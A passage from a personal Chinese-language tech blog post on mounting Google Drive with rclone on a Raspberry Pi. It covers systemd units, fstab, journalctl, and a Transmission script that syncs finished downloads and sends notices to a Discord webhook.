href=\"#掛載-1\" class=\"headerlink\" title=\"掛載\"></a>掛載</h3><p><strong>這邊需要注意權限問題</strong></p>\n<p>假如要掛載 <code>/mnt/xxx</code> 可能未因為 <code>user</code> 權限無法掛載<br>可以使用家目錄 或者吧 <code>/mnt/xxx</code> 改成 777<br>或者切換 <code>root</code> 做 mount</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rclone mount --vfs-cache-mode writes --fast-list --vfs-cache-max-size 100M gdrive: /mnt/gdrive</span><br></pre></td></tr></table></figure>\n<p>有執行發現這一行不是背景執行…<br>除了用<code>&amp;</code><br>還發現有人用 tmux</p>\n<h3 id=\"Tmux\"><a href=\"#Tmux\" class=\"headerlink\" title=\"Tmux\"></a>Tmux</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tmux # create tmux </span><br><span class=\"line\">tmux ls # tmux ls</span><br><span class=\"line\">tmux a -t 0# tmux session</span><br><span class=\"line\">Ctrl+b &amp; d (關掉背景執行)</span><br></pre></td></tr></table></figure>\n<p>簡單說一下，<code>tmux</code>建立一個 session，做 mount 動做<br>這時候會發現不能做任何動作，<code>Ctrl+b &amp; d</code>會回到原始的 bash<br>再輸入<code>tmux</code>，可以做<code>cp 動作到gdrive</code> 再<code>Ctrl+b &amp; d</code><br>關掉 command line 連線都還會在<br><code>tmux ls</code>可以看到還有哪些 session 再跑</p>\n<p>因為指令不熟又不常用，之前用過的都忘了差不多<br>有空再補…</p>\n<h3 id=\"自動掛載\"><a href=\"#自動掛載\" class=\"headerlink\" title=\"自動掛載\"></a>自動掛載</h3><p>假如用網路上範例<br>路徑存放在<code>/etc/systemd/system/rclone.service</code><br>使用前建議用root掛載</p>\n<p>但聽說一般 user 也能設定<br>我沒有仔細研究<br><code>~/.config/systemd/user/rclone@.service</code></p>\n<p>改完記得要<strong>systemctl daemon-reload</strong></p>\n<p>(還沒測試)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=rclone: Remote FUSE filesystem for cloud storage config %i</span><br><span class=\"line\">Documentation=man:rclone(1)[Service]</span><br><span class=\"line\">Type=notify</span><br><span class=\"line\">ExecStartPre=/bin/mkdir -p %h/mnt/%i</span><br><span class=\"line\">ExecStart= \\</span><br><span class=\"line\">  /usr/bin/rclone mount \\</span><br><span class=\"line\">    --fast-list \\</span><br><span class=\"line\">    --vfs-cache-mode writes \\</span><br><span class=\"line\">    --vfs-cache-max-size 100M \\</span><br><span class=\"line\">    %i: %h/mnt/%i[Install]</span><br><span class=\"line\">WantedBy=default.target</span><br></pre></td></tr></table></figure></p>\n<p>剛剛發現<code>--daemon</code>有這個，<del>尚未測試</del>測是這個可運作!!</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=RClone Service</span><br><span class=\"line\">After=network-online.target</span><br><span class=\"line\">Wants=network-online.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=notify</span><br><span class=\"line\">ExecStart=/usr/sbin/rclone mount --allow-other --dir-cache-time 48h --vfs-read-chunk-size 16M --buffer-size 2G Googlecrypt: /home/plex</span><br><span class=\"line\">ExecStop=/bin/fusermount -uz /home/plex</span><br><span class=\"line\">Restart=on-abort</span><br></pre></td></tr></table></figure>\n<p>最終我電腦設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=RClone Service</span><br><span class=\"line\">After=network-online.target</span><br><span class=\"line\">Wants=network-online.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=pi</span><br><span class=\"line\">Type=notify</span><br><span class=\"line\">#ExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive</span><br><span class=\"line\">ExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive</span><br><span class=\"line\">ExecStop=/bin/fusermount -uz /mnt/gdrive</span><br><span class=\"line\">RestartSec=30</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<p>allow-root 不能用…，好像是 bug</p>\n<ul>\n<li><a href=\"https://forum.rclone.org/t/rclone-auto-mount/6353\" target=\"_blank\" rel=\"noopener\">Rclone auto mount - rclone - rclone forum</a></li>\n<li><a href=\"https://www.jamescoyle.net/how-to/3116-rclone-systemd-startup-mount-script\" target=\"_blank\" rel=\"noopener\">rclone Systemd startup mount script – JamesCoyle.net Limited</a></li>\n<li><a href=\"https://github.com/rclone/rclone/wiki/rclone-fstab-mount-helper-script\" target=\"_blank\" rel=\"noopener\">rclone fstab mount helper script · rclone/rclone Wiki</a></li>\n<li>Restart 可參考<a href=\"https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\" target=\"_blank\" rel=\"noopener\">Systemd 入门教程：实战篇 - 阮一峰的网络日志</a></li>\n<li><a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (正體中文) - ArchWiki</a>)<h3 id=\"移除-rclone\"><a href=\"#移除-rclone\" class=\"headerlink\" title=\"移除 rclone\"></a>移除 rclone</h3></li>\n</ul>\n<p><a href=\"https://github.com/pageauc/rclone4pi/wiki#how-to-remove-rclone\" target=\"_blank\" rel=\"noopener\">Home · pageauc/rclone4pi Wiki</a></p>\n<h3 id=\"使用-Google-Driver-注意事項\"><a href=\"#使用-Google-Driver-注意事項\" class=\"headerlink\" title=\"使用 Google Driver 注意事項\"></a>使用 Google Driver 注意事項</h3><ul>\n<li>1 天上傳最多 750 GB</li>\n<li>1 個檔案不能超過 100 GB</li>\n<li>不能太平凡掛載</li>\n</ul>\n<p>超過小心帳號可能會被 Ban!!</p>\n<h3 id=\"rsync-複製檔案顯示進度\"><a href=\"#rsync-複製檔案顯示進度\" class=\"headerlink\" title=\"rsync 複製檔案顯示進度\"></a>rsync 複製檔案顯示進度</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsync -rvh --progress /mnt/ddd /mnt/gdrive</span><br></pre></td></tr></table></figure>\n<p>-r 複製資料夾記得要加上去</p>\n<p>影片不建議使用 rsync ，不知道為什麼丟到上面去，影片不會轉成線上看<br>下載檔案後面會加奇怪副檔名，所以用 <code>cp</code> 比較不會有問題</p>\n<p>後來發現<code>rclone sync xxx gd:xxx -P</code> 也能看狀態= =</p>\n<h3 id=\"Raspberry-PI-掛載-USB\"><a href=\"#Raspberry-PI-掛載-USB\" class=\"headerlink\" title=\"Raspberry PI 掛載 USB\"></a>Raspberry PI 掛載 USB</h3><p>之前有在 <a href=\"http://yehnan.blogspot.com/2016/05/raspberry-piusb.html\" target=\"_blank\" rel=\"noopener\">葉難: Raspberry Pi：自動掛載USB隨身碟</a> 看到怎麼使用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">UUID=&quot;F840-AAE1&quot;  /media/usbstick vfat   rw,defaults 0 0</span><br></pre></td></tr></table></figure></p>\n<p>後面兩個 0 代表<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">    第五欄：能否被 dump 備份指令作用：</span><br><span class=\"line\"></span><br><span class=\"line\">dump 是一個用來做為備份的指令，不過現在有太多的備份方案了，所以這個項目可以不要理會啦！直接輸入 0 就好了！</span><br><span class=\"line\"></span><br><span class=\"line\">    第六欄：是否以 fsck 檢驗磁區：</span><br><span class=\"line\"></span><br><span class=\"line\">早期開機的流程中，會有一段時間去檢驗本機的檔案系統，看看檔案系統是否完整 (clean)。 不過這個方式使用的主要是透過 fsck 去做的，我們現在用的 xfs 檔案系統就沒有辦法適用，因為 xfs 會自己進行檢驗，不需要額外進行這個動作！所以直接填 0 就好了。</span><br></pre></td></tr></table></figure></p>\n<p>參考:<a href=\"http://linux.vbird.org/linux_basic/0230filesystem.php#fstab\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第七章、Linux 磁碟與檔案系統管理</a></p>\n<ol>\n<li>sudo fdisk -l  (查看裝置有沒有掛載)</li>\n<li>$ sudo mkdir /mnt/extHDD (建置掛載用的資料夾和權限)<br>$ sudo chown pi:pi /mnt/extHDD</li>\n<li>sudo mount -t vfat  /dev/sda1 /mnt/extHDD # (test mount) ext4的話，把 vfat 改成 ext4<br><code>-o uid=pi,gid=pi</code>我的樹梅派家這段會失敗</li>\n<li>sudo umount /dev/sda1 # 解除掛載</li>\n<li>sudo blkid # 查看掛載的 UUID</li>\n<li>sudo vim /etc/fstab  </li>\n<li>加入 UUID=”F840-AAE1”  /mnt/extHDD vfat   rw,defaults 0 0 #(-a, –all 掛載 fstab 中的所有文件系統)</li>\n</ol>\n<p><a href=\"https://www.itread01.com/content/1553540779.html\" target=\"_blank\" rel=\"noopener\">Mount的用法詳細解析 - IT閱讀</a></p>\n<p>最近看到<a href=\"https://docs.aws.amazon.com/zh_tw/AWSEC2/latest/UserGuide/ebs-using-volumes.html\" target=\"_blank\" rel=\"noopener\">使 Amazon EBS 磁碟區可供在 Linux 上使用 - Amazon Elastic Compute Cloud</a>這篇<br>UUID=aebf131c-6957-451e-8d34-ec978d9581ae  /data  xfs  defaults,<strong>nofail</strong>  0  2</p>\n<blockquote>\n<p>如果曾在不掛載此磁碟區的狀態下開機執行個體 (例如，在將磁碟區移至其他執行個體後)，nofail 掛載選項可讓執行個體繼續開機，即使在掛載磁碟區的作業出現錯誤。包括 16.04 前之 Ubuntu 版本在內的 Debian 衍生產品，也必須新增 nobootwait 掛載選項。 </p>\n</blockquote>\n<p>/usr/bin/rclone mount –allow-root –vfs-cache-mode writes –vfs-cache-max-size 100M gdrive: /mnt/gdrive<br>2019/10/16 16:15:54 mount helper error: fusermount: option allow_root only allowed if ‘user_allow_other’ is set in /etc/fuse.conf</p>\n<h3 id=\"systemctl-和-service-掛載的差異\"><a href=\"#systemctl-和-service-掛載的差異\" class=\"headerlink\" title=\"systemctl 和 service 掛載的差異\"></a>systemctl 和 service 掛載的差異</h3><p>在這次藉著學習到簡單使用 systemctl 設定服務<br>但很好奇這兩個差異</p>\n<blockquote>\n<p>systemd是Linux系統最新的初始化系統(init),作用是提高系統的啟動速度，儘可能啟動較少的進程，儘可能更多進程並發啟動。<br>systemd對應的進程管理命令是systemctl</p>\n</blockquote>\n<p>參考:<a href=\"https://www.cnblogs.com/shijingjing07/p/9301590.html\" target=\"_blank\" rel=\"noopener\">Linux 服務管理兩種方式service和systemctl - 迪米特 - 博客園</a><br>裡面還有講:<code>主要有四種類型文件.mount,.service,.target,.wants</code></p>\n<p>有找到比較兩者指令差異<a href=\"https://blog.csdn.net/capecape/article/details/78505511\" target=\"_blank\" rel=\"noopener\">centos7 systemctl取代service和chkconfig来实现系统管理 - cape的博客 - CSDN博客</a> <a href=\"/blog/2019/10/14/rclone-掛載硬碟小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>發現選擇 systemctl 還是能繼續用 service 指令<br>習慣改不了用 service XDD</p>\n<p>但設定上 service 設定服務需要用 chkconfig<br>用systemctl 直接 enable/disable 就能解決</p>\n<p><a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (简体中文) - ArchWiki</a>)<br><a href=\"https://wiki.archlinux.org/index.php/Systemd/User_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd/User (简体中文) - ArchWiki</a>)</p>\n<p><code>journalctl</code> 查看 systemctl log<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#查看所有日誌（默認情況下 ，只保存本次啟動的日誌） $ sudo journalctl #查看內核日誌（不顯示應用日誌） </span><br><span class=\"line\">$ sudo journalctl -k #查看系統本次啟動的日誌 </span><br><span class=\"line\">$ sudo journalctl -b </span><br><span class=\"line\">$ sudo journalctl -b -0 #查看上一次啟動的日誌（需更改設置） </span><br><span class=\"line\">$ sudo journalctl -b -1 #查看指定時間的日誌 </span><br><span class=\"line\">$ sudo journalctl --since=&quot;2017-09-26 22:17:16&quot; </span><br><span class=\"line\">$ sudo journalctl --since &quot;30 min ago&quot; </span><br><span class=\"line\">$ sudo journalctl --since yesterday </span><br><span class=\"line\">$ sudo journalctl --since &quot;2015-01-10&quot; --until &quot;2017-01-11 03:00&quot; </span><br><span class=\"line\">$ sudo journalctl --since 09:00 --until &quot;1 hour ago&quot; #顯示尾部的最新10行日誌 </span><br><span class=\"line\">$ sudo journalctl -n #顯示尾部指定行數的日誌 </span><br><span class=\"line\">$ sudo journalctl -n 50 #實時滾動顯示最新日誌 </span><br><span class=\"line\">$ sudo journalctl -f #查看指定服務的日誌 </span><br><span class=\"line\">$ sudo journalctl /usr/lib/systemd/systemd #查看指定進程的日誌 </span><br><span class=\"line\">$ sudo journalctl _PID=1 #查看某個路徑的腳本的日誌 </span><br><span class=\"line\">$ sudo journalctl /usr/bin/bash #查看指定用戶的日誌 </span><br><span class=\"line\">$ sudo journalctl _UID=33 --since today #查看某個 Unit 的日誌 </span><br><span class=\"line\">$ sudo journalctl -u nginx.service </span><br><span class=\"line\">$ sudo journalctl -u nginx.service --since today #實時滾動顯示某個 Unit 的最新日誌 </span><br><span class=\"line\">$ sudo journalctl -u nginx.service -f #合併顯示多個 Unit 的日誌 </span><br><span class=\"line\">$ journalctl -u nginx.service -u php-fpm.service --since today #查看指定優先級（及其以上級別）的日誌，共有8級</span><br><span class=\"line\"> # 0: emerg</span><br><span class=\"line\"> # 1: alert</span><br><span class=\"line\"> # 2: crit</span><br><span class=\"line\"> # 3: err</span><br><span class=\"line\"> # 4: warning</span><br><span class=\"line\"> # 5: notice</span><br><span class=\"line\"> # 6: info</span><br><span class=\"line\"> # 7: debug </span><br><span class=\"line\">$ sudo journalctl -p err -b #日誌默認分頁輸出，--no-pager 改為正常的標準輸出 </span><br><span class=\"line\">$ sudo journalctl --no-pager #以 JSON 格式（單行）輸出 </span><br><span class=\"line\">$ sudo journalctl -b -u nginx.service -o json #以 JSON 格式（多行）輸出，可讀性更好 </span><br><span class=\"line\">$ sudo journalctl -b -u nginx.serviceqq -o json-pretty #顯示日誌占據的硬碟空間 </span><br><span class=\"line\">$ sudo journalctl --disk-usage #指定日誌文件占據的最大空間 </span><br><span class=\"line\">$ sudo journalctl --vacuum-size=1G #指定日誌文件保存多久 </span><br><span class=\"line\">$ sudo journalctl --vacuum-time=1years</span><br><span class=\"line\"></span><br><span class=\"line\">原文網址：https://kknews.cc/code/pqyayy2.html</span><br></pre></td></tr></table></figure></p>\n<p>相關網頁</p>\n<ul>\n<li><a href=\"https://kknews.cc/zh-tw/code/pqyayy2.html\" target=\"_blank\" rel=\"noopener\">systemd一種更好的啟動方式 - 每日頭條</a></li>\n<li><a href=\"http://linux.vbird.org/linux_basic/0560daemons.php#systemd_cfg_vsftpd\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十七章、認識系統服務 (daemons)</a></li>\n<li><a href=\"https://blog.lilydjwg.me/2014/2/2/systemd-user-daemons.42631.html\" target=\"_blank\" rel=\"noopener\">玩转 systemd 之用户级服务管理 - 依云’s Blog</a></li>\n</ul>\n<p>聽說一般 user 家目錄也可以做服務設定<br>這一快我就先不研究<br>改天用到再說</p>\n<p><strong>2020-04-26</strong></p>\n<p>這些查詢滿常用的</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 檢查 nginx 服務是否正在運行</span></span><br><span class=\"line\">systemctl is-active nginx.service</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 檢查 nginx 服務是否有設定開機自動啟動</span></span><br><span class=\"line\">systemctl is-enabled nginx.service</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 檢查 nginx 服務是否啟動失敗</span></span><br><span class=\"line\">systemctl is-failed nginx.service</span><br></pre></td></tr></table></figure>\n<h3 id=\"tmux-掛載方式-不建議用\"><a href=\"#tmux-掛載方式-不建議用\" class=\"headerlink\" title=\"tmux 掛載方式(不建議用)\"></a>tmux 掛載方式(不建議用)</h3><p>在沒知道用 systemctl 原本想使用 tmux<br>不過看起來好像能跑，但我覺得 systemctl 比較完美</p>\n<p><a href=\"https://gist.github.com/B-Galati/c7890f86fc2bfce0b98c5410d964727a\" target=\"_blank\" rel=\"noopener\">tmux script example</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">tmux new-window -d -n <span class=\"string\">'test'</span> <span class=\"string\">'ping 127.0.0.1'</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"tranmission\"><a href=\"#tranmission\" class=\"headerlink\" title=\"tranmission\"></a>tranmission</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;script-torrent-done-enabled&quot;: true,</span><br><span class=\"line\">&quot;script-torrent-done-filename&quot;: &quot;/home/user/script.sh&quot;,</span><br></pre></td></tr></table></figure>\n<p>記得 chmod a+x /home/user/script.sh<br>裡面對印的<br>conf 也要加 777 (tranmission不同權限，或加群組權限)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 注意需要看.config/rclone 資料夾和檔案權限，需要到rx</span><br><span class=\"line\">RCLONE_CONFIG_PATH=&quot;--config=/home/pi/.config/rclone/rclone.conf&quot;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://gist.github.com/awesometic/253b740d45f8e5f95b56ec24f33a9444\" target=\"_blank\" rel=\"noopener\">Transmission download complete shell script for moving complete files and removing its torrent entry</a><br><a href=\"https://gist.github.com/pawelszydlo/e2e1fc424f2c9d306f3a\" target=\"_blank\" rel=\"noopener\">Script to clear finished torrents from transmission-daemon</a><br><a href=\"https://community.wd.com/t/guide-auto-removal-of-downloads-from-transmission-2-82/93156\" target=\"_blank\" rel=\"noopener\">Guide : Auto removal of downloads from transmission 2.82 - My Cloud - Personal Cloud Storage / My Cloud - WD Community</a><br><a href=\"https://blog.longwin.com.tw/2013/05/tmux-auto-ssh-remote-2013/\" target=\"_blank\" rel=\"noopener\">Tmux 開啟後 自動 SSH 連結多台指定機器 | Tsung’s Blog</a><br><a href=\"https://forum.openmediavault.org/index.php/Thread/13290-Transmission-Script-to-move-completed-downloads-to-directories-or-how-to-create/\" target=\"_blank\" rel=\"noopener\">Transmission - Script to move completed downloads to directories, or how to create script? - Plugins - openmediavault</a><br><a href=\"https://superuser.com/questions/735691/copy-completed-files-larger-than-1024m-to-another-directory\" target=\"_blank\" rel=\"noopener\">ubuntu - Copy completed files larger than 1024M to another directory - Super User</a><br><a href=\"https://superuser.com/questions/735691/copy-completed-files-larger-than-1024m-to-another-directory/735757#735757\" target=\"_blank\" rel=\"noopener\">ubuntu - Copy completed files larger than 1024M to another directory - Super User</a></p>\n<p>密碼不要取驚嘆號<br><a href=\"https://linux.cn/article-5608-1.html\" target=\"_blank\" rel=\"noopener\">技术|在Linux命令行下令人惊叹的惊叹号（!）</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Oct 18 23:35:12 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:12 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf295018896: permission denied</span><br><span class=\"line\">Oct 18 23:35:17 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:17 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf984318943: permission denied</span><br></pre></td></tr></table></figure>\n<p>我改寫的 Script<br>有通知 discord 功能<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">DSCORD_WEBHOOK=<span class=\"string\">\"https://discordapp.com/api/webhooks/*\"</span></span><br><span class=\"line\"><span class=\"comment\"># 需要做同步的路徑，結尾資料夾不用/</span></span><br><span class=\"line\">LOCAL_SYNCDIR=<span class=\"string\">\"/mnt/extHDD/Download\"</span></span><br><span class=\"line\"><span class=\"comment\"># RCLONE 結尾不能有 /</span></span><br><span class=\"line\">RCLONE_SYNCDIR=<span class=\"string\">\"gdrive:/test\"</span></span><br><span class=\"line\"><span class=\"comment\"># 注意需要看.config/rclone 資料夾和檔案權限，需要到rx</span></span><br><span class=\"line\">RCLONE_CONFIG_PATH=<span class=\"string\">\"--config=/home/pi/.config/rclone/rclone.conf\"</span></span><br><span class=\"line\">AUTH=<span class=\"string\">\"--auth admin:admin\"</span></span><br><span class=\"line\"><span class=\"comment\">#### debug end</span></span><br><span class=\"line\">df -H | grep -vE <span class=\"string\">'^Filesystem|tmpfs|cdrom|udev|已用'</span> | awk <span class=\"string\">'&#123; print $5 \" \" $1 &#125;'</span> | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> output;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">  usep=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$output</span> | awk <span class=\"string\">'&#123; print $1&#125;'</span> | cut -d<span class=\"string\">'%'</span> -f1  )</span><br><span class=\"line\">  partition=$(<span class=\"built_in\">echo</span> <span class=\"variable\">$output</span> | awk <span class=\"string\">'&#123; print $2 &#125;'</span> )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$usep</span> -ge 80 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    msg=<span class=\"string\">\"⚠️注意快超出硬碟空間\\\\\\\"<span class=\"variable\">$partition</span>\\\\\\\" (<span class=\"variable\">$usep</span>%) on <span class=\"variable\">$(hostname)</span> as on <span class=\"variable\">$(date)</span>\"</span></span><br><span class=\"line\">    url=<span class=\"variable\">$DSCORD_WEBHOOK</span></span><br><span class=\"line\">    curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">    -X POST \\</span><br><span class=\"line\">    -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;msg&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$url</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"string\">\"<span class=\"variable\">$TR_TORRENT_DIR</span>\"</span> =~ ^<span class=\"string\">\"<span class=\"variable\">$LOCAL_SYNCDIR</span>\"</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"pass\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ -f <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        flock -x  /tmp/rclone.lock rclone copy <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$RCLONE_SYNCDIR</span>\"</span></span><br><span class=\"line\">        rclone check <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$RCLONE_SYNCDIR</span>\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> </span><br><span class=\"line\">        flock -x  /tmp/rclone.lock rclone copy <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$RCLONE_SYNCDIR</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span></span><br><span class=\"line\">        rclone check <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$RCLONE_SYNCDIR</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> --size-only</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        msg=<span class=\"string\">\"✅ <span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，並完成同步\"</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">        url=<span class=\"variable\">$DSCORD_WEBHOOK</span></span><br><span class=\"line\">        curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">        -X POST \\</span><br><span class=\"line\">        -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;msg&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$url</span></span><br><span class=\"line\">        transmission-remote <span class=\"variable\">$AUTH</span> -t <span class=\"variable\">$TR_TORRENT_ID</span> --remove-and-delete</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"FAIL\"</span></span><br><span class=\"line\">        msg=<span class=\"string\">\"⚠️ <span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，但同步失敗\"</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">        url=<span class=\"variable\">$DSCORD_WEBHOOK</span></span><br><span class=\"line\">        curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">        -X POST \\</span><br><span class=\"line\">        -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;msg&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$url</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"✅<span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，不需要做同步\"</span></span><br><span class=\"line\">    msg=<span class=\"string\">\"✅<span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，不需要做同步\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">    url=<span class=\"variable\">$DSCORD_WEBHOOK</span></span><br><span class=\"line\">    curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">    -X POST \\</span><br><span class=\"line\">    -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;msg&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$url</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure></p>\n<p>有時候會失敗，補跑方式也很簡單<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> TR_TORRENT_DIR=<span class=\"string\">\"/mnt/extHDD/Download\"</span></span><br><span class=\"line\">ls <span class=\"variable\">$TR_TORRENT_DIR</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> TR_TORRENT_NAME=<span class=\"string\">\"xxx\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#測試</span></span><br><span class=\"line\"><span class=\"comment\">#echo $&#123;TR_TORRENT_DIR&#125;/$&#123;TR_TORRENT_NAME&#125;</span></span><br><span class=\"line\">ls <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">/etc/transmission-daemon/syncGdrive.sh</span><br></pre></td></tr></table></figure></p>\n<p>最近這個腳本還算完美的<br>不過處理大檔案<code>rclone check</code>太久了</p>\n<blockquote>\n<p>→ thousandday: rclone sync比對修改時間和size(很快,省流量) 05/29 18:17<br>→ thousandday: rclone check –size-only比對size(很快,省流量) 05/29 18:18<br>→ thousandday: rclone sync -c完整下載後Checksum(慢,費流量) 05/29 18:18<br>→ thousandday: rclone check下載hash值後Checksum(慢,省流量) 05/29 18:18<br>→ thousandday: Google Drive有支援hash可以直接撈到MD5 05/29 18:19<br>→ thousandday: 沒支援hash的雲端空間要Checksum只能完整下載 05/29 18:19<br>→ thousandday: 用rclone sync -c或rclone check –download 05/29 